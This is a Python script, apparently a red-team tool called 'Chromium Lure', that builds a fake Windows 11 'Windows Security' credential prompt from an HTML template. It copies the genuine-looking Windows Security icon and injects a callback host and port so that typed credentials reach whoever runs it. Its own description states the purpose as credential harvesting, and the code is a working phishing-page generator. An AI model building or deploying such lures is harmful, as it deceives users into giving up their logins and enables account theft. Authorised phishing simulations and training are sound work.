#!/usr/bin/env python3
import argparse
import sys
from pathlib import Path

WINDOWS_SECURITY_SVG = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2aWV3Qm94PSIwIDAgMzg1Ljg0IDQwMS4zMiI+PGRlZnM+PGxpbmVhckdyYWRpZW50IGlkPSJhIiB4MT0iNTY0LjA4IiB5MT0iMTQ0LjE2IiB4Mj0iMzk5Ljk1IiB5Mj0iNDI4LjQ0IiBncmFkaWVudFRyYW5zZm9ybT0ibWF0cml4KDEsIDAsIDAsIC0xLCAwLCA3NzApIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+PHN0b3Agb2Zmc2V0PSIwLjM3IiBzdG9wLWNvbG9yPSIjMTE0YThiIi8+PHN0b3Agb2Zmc2V0PSIxIiBzdG9wLWNvbG9yPSIjMGM1OWE0Ii8+PC9saW5lYXJHcmFkaWVudD48bGluZWFyR3JhZGllbnQgaWQ9ImIiIHgxPSI0MDIuMTgiIHkxPSIxOTUuODQiIHgyPSIyNjIuNjEiIHkyPSI0MzcuNTkiIGdyYWRpZW50VHJhbnNmb3JtPSJtYXRyaXgoMSwgMCwgMCwgLTEsIDAsIDc3MCkiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIj48c3RvcCBvZmZzZXQ9IjAiIHN0b3AtY29sb3I9IiMwNjY5YmMiLz48c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiMwMDc4ZDQiLz48L2xpbmVhckdyYWRpZW50PjxsaW5lYXJHcmFkaWVudCBpZD0iYyIgeDE9IjUyOC44MyIgeTE9IjM2MC4zNiIgeDI9IjM5MC44MyIgeTI9IjU5OS4zNiIgZ3JhZGllbnRUcmFuc2Zvcm09Im1hdHJpeCgxLCAwLCAwLCAtMSwgMCwgNzcwKSIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiPjxzdG9wIG9mZnNldD0iMCIgc3RvcC1jb2xvcj0iIzAwNzhkNCIvPjxzdG9wIG9mZnNldD0iMSIgc3RvcC1jb2xvcj0iIzE0OTNkZiIvPjwvbGluZWFyR3JhZGllbnQ+PGxpbmVhckdyYWRpZW50IGlkPSJkIiB4MT0iMzUzLjYyIiB5MT0iMzgwLjciIHgyPSIyMTUuNjIiIHkyPSI2MTkuNzEiIGdyYWRpZW50VHJhbnNmb3JtPSJtYXRyaXgoMSwgMCwgMCwgLTEsIDAsIDc3MCkiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIj48c3RvcCBvZmZzZXQ9IjAiIHN0b3AtY29sb3I9IiMyOGFmZWEiLz48c3RvcCBvZmZzZXQ9IjAuNzQiIHN0b3AtY29sb3I9IiMzY2NiZjQiLz48L2xpbmVhckdyYWRpZW50PjwvZGVmcz48cGF0aCBkPSJNMzg0LDU4NC42NmExMy41NSwxMy41NSwwLDAsMCw2LjcyLTEuNzZDNDkwLjMzLDUyNS40Niw1NTYuNzYsNDYxLDU3MywzNzYuMjhxLjQyLTIuMTkuNzktNC4zOEwzNzAuNjksMzU4LjQ1WiIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoLTE5MS4wOCAtMTgzLjM0KSIgc3R5bGU9ImZpbGw6dXJsKCNhKSIvPjxwYXRoIGQ9Ik0zNzcuMjcsNTgyLjlhMTMuNTQsMTMuNTQsMCwwLDAsNi43MiwxLjc2VjM1OC40NEwxOTQuMjMsMzcxLjg5cS4zOCwyLjIuNzksNC4zOEMyMTEuMjQsNDYxLDI3Ny42Niw1MjUuNDUsMzc3LjI3LDU4Mi44OVoiIHRyYW5zZm9ybT0idHJhbnNsYXRlKC0xOTEuMDggLTE4My4zNCkiIHN0eWxlPSJmaWxsOnVybCgjYikiLz48cGF0aCBkPSJNNTc2LjkyLDI0OWExMy4xLDEzLjEsMCwwLDAtMTIuNzQtMTMuMTVjLTYwLjI1LTEuMjQtODEuNTYtMTEuNjUtMTExLjI3LTMxLjdBMTE3LjcxLDExNy43MSwwLDAsMCwzODQsMTgzLjM2bC0yMCwxODguNEg1NzMuNzlhMjEzLDIxMywwLDAsMCwzLjEyLTM2WiIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoLTE5MS4wOCAtMTgzLjM0KSIgc3R5bGU9ImZpbGw6dXJsKCNjKSIvPjxwYXRoIGQ9Ik0zODQsMTgzLjM2YTExNy43MSwxMTcuNzEsMCwwLDAtNjguOSwyMC43OWMtMjkuNzIsMjAuMDYtNTEsMzAuNDctMTExLjI3LDMxLjdBMTMuMSwxMy4xLDAsMCwwLDE5MS4wOCwyNDl2ODYuOGEyMTMsMjEzLDAsMCwwLDMuMTIsMzZIMzg0WiIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoLTE5MS4wOCAtMTgzLjM0KSIgc3R5bGU9ImZpbGw6dXJsKCNkKSIvPjwvc3ZnPg=="

def parse_args(argv=None):
    parser = argparse.ArgumentParser(
        description="Chromium Lure - Generates realistic Windows 11 credential prompts for credential harvesting.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )

    parser.add_argument(
        "host",
        nargs="?",
        default="localhost",
        help="Callback hostname or IP (default: localhost)",
    )
    parser.add_argument(
        "port",
        nargs="?",
        type=int,
        default=8080,
        help="Callback port (default: 8080)",
    )
    parser.add_argument(
        "-o", "--output",
        metavar="FILE",
        default="prompt.html",
        help="Output HTML file (default: prompt.html)",
    )
    parser.add_argument(
        "-m", "--message",
        default="Windows Security",
        help="Main prompt message (shown under title)",
    )
    parser.add_argument(
        "-u", "--username",
        help="Pre-filled username",
    )
    parser.add_argument(
        "--theme",
        choices=["dark", "light"],
        default="dark",
        help="UI theme",
    )

    parser.add_argument("--title", default="Windows Security", help="Window title (appears in title bar and tab)")
    parser.add_argument("--favicon", default=WINDOWS_SECURITY_SVG, help="Full favicon href (data URI or URL)")
    return parser.parse_args(argv)

def main():
    args = parse_args()
    template_path = Path("assets/windows/base.html")
    html = template_path.read_text(encoding="utf-8")

    css_file = "dark.css" if args.theme == "dark" else "light.css"
    css_content = Path("assets/windows") / css_file
    css_content = css_content.read_text(encoding="utf-8") if css_content.exists() else ""

    html = html.replace("REPLACE_WITH_IP", f'"{args.host}"')
    html = html.replace("REPLACE_WITH_PORT", str(args.port))
    html = html.replace("REPLACE_WITH_CSS", css_content)
    html = html.replace("REPLACE_WITH_MESSAGE", args.message)
    html = html.replace("REPLACE_WITH_THEME_COLOR", "#202020" if args.theme == "dark" else "#ffffff")
    html = html.replace("REPLACE_WITH_TITLE", f"{args.title}")
    html = html.replace(
        "REPLACE_WITH_FAVICON",
        f'href="{args.favicon}"'
    )

    if args.username:
        html = html.replace('id="username" name="username"', f'id="username" name="username" value="{args.username}"')

    Path(args.output).write_text(html, encoding="utf-8")
    print(f"[+] Done → {args.output} ({args.theme})")

if __name__ == "__main__":
    main()